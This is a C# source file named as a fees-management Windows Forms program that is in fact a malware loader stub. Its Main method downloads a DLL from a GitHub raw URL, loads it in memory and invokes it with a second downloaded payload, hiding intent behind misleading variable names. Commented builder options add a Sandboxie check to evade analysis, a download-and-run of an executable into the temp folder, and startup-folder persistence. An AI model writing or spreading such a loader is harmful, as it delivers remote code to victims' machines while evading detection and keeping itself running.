using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;


namespace FeesManagementProject
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {

            
			//STpucLBljmzUGnGzBgNxGKNYn controlsandboxie();

			//KLcWSsBQfllFIZyCyOYemPsaI


			//CUENHezMWVDjiCgznDhEKrSoy try
			//CUENHezMWVDjiCgznDhEKrSoy {
			//CUENHezMWVDjiCgznDhEKrSoy  System.Net.WebClient appyrun = new System.Net.WebClient();
			//CUENHezMWVDjiCgznDhEKrSoy appyrun.DownloadFile("www.server.com/server.exe", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
			//CUENHezMWVDjiCgznDhEKrSoy  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
			//CUENHezMWVDjiCgznDhEKrSoy }
			//CUENHezMWVDjiCgznDhEKrSoy catch
			//CUENHezMWVDjiCgznDhEKrSoy {
			//CUENHezMWVDjiCgznDhEKrSoy }



            ServicePointManager.Expect100Continue = true;

            ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls11;

            ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls12;   
     
            System.Net.WebClient client = new System.Net.WebClient();

            Uri uri = new Uri("7867");

            byte[] dbytes = client.DownloadData(uri);

            Uri f = new Uri("https://raw.githubusercontent.com/cyberdevelopers/cybercoder/main/bindingflags.dll");

            byte[] delete = client.DownloadData(f);

            string on = Application.ExecutablePath;

            object student = new object[] {on, string.Empty, dbytes, true };

            Assembly database;

            string answers_microsoft_com = null;

            database = AppDomain.CurrentDomain.Load(delete);

            database.GetType("bindingflags.githubusercontent").InvokeMember("unknown", System.Reflection.BindingFlags.InvokeMethod, null, answers_microsoft_com, (object[])student);

            
			//VzeGjkZhCJEOdKImAfLmBcyiv  {
			//VzeGjkZhCJEOdKImAfLmBcyiv      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\Project.exe");
			//VzeGjkZhCJEOdKImAfLmBcyiv  }

        }



        //STpucLBljmzUGnGzBgNxGKNYn [DllImport("kernel32.dll")]
        //STpucLBljmzUGnGzBgNxGKNYn public static extern IntPtr GetModuleHandle(string lpModuleName);
        //STpucLBljmzUGnGzBgNxGKNYn static void controlsandboxie()
        //STpucLBljmzUGnGzBgNxGKNYn {
        //STpucLBljmzUGnGzBgNxGKNYn     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
        //STpucLBljmzUGnGzBgNxGKNYn     {
        //STpucLBljmzUGnGzBgNxGKNYn        Environment.Exit(1);
        //STpucLBljmzUGnGzBgNxGKNYn     }
        //STpucLBljmzUGnGzBgNxGKNYn }

    

    }
}
